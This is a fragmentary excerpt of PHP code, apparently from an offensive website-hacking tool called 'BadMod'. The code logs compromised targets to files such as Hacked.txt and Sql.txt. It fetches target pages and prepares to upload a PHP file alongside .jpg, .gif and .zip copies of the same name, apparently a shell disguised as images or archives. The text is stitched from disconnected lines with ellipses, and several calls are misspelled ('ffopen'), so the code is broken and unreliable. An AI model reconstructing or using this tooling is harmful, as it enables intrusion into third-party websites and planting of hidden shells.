...
$hacked = ffopen("Result/AFD.txt","a+");
...
$hacked = ffopen("Result/Hacked.txt","a+");
...
$result2.= $source;
$result2.= "\n  -[-============== WHOIS END ===============-]- \n";
$hacked = fopen("Result/singleSite.txt","a+");
echo $result;
}	
...
$source = @file_get_contents("$target2");	
$hacked = fopen("Result/sites.txt","a+");
...
$hacked = ffopen("Result/Sql.txt","a+");
...
$uploadfile="files/BadMod.jpg";
$uploadfile2="files/BadMod.php";
$uploadfile=@realpath($uploadfile) ;
...
$result = ffopen("Result/Hacked.txt","a+");	
...
$url = "http://".$url;	
     ...
     $file1='files/BadMod.zip';
     $file2='files/BadMod.gif';
if (function_exists('curl_file_create')) { // php 5.5+
